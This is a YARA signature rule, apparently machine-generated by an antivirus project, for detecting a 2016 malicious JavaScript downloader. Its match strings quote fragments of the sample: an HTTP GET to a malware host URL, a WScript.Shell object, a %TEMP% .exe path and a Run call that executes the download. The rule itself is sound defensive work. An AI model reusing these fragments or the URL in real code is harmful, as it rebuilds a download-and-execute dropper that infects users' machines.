rule sig_20160330_5c4ab7440a9d365a15697aa0121a915b {
  meta:
    description = "datamaliciousorder - file 20160330_5c4ab7440a9d365a15697aa0121a915b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5198416b75cc8497fac9c0c894f16d3991ba1c50f0d8630c6b50861c4508626e"

  strings:
    $s1  = "D0[M](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "var ST = function EG() {return WScript[H0](\"WScript\"+\".Shell\");}(), JN = 11;" fullword ascii
    $s3  = "function A(QT, V0){I0 = I0 * 1; return QT - V0;};" fullword ascii
    $s4  = "if (D0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NX(){return Z + \"\";};" fullword ascii
    $s6  = "function H() {return ST[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AaIFaNr0MRjfNi.ex\" + \"e\";};" fullword ascii
    $s7  = "function K() {return ((YF == true) && (YF == I2)) ? 1 : I0;};" fullword ascii
    $s8  = "function I(H1){ST[\"Run\"](H1, I0, I0);};" fullword ascii
    $s9  = "function T()" fullword ascii
    $s10 = "var Q0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function R(){return H0;};" fullword ascii
    $s12 = "function UE(V) {var WN = (1, 2, 3, 4, 5, V); return WN;};" fullword ascii
    $s13 = "}while (ZX);" fullword ascii
    $s14 = "function RZ(){return 22;};" fullword ascii
    $s15 = "return A(ND, WW);" fullword ascii
    $s16 = "var J0 = false;" fullword ascii
    $s17 = "I2 = true; " fullword ascii
    $s18 = "var I2 = false;" fullword ascii
    $s19 = "var YF = false;" fullword ascii
    $s20 = "YF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}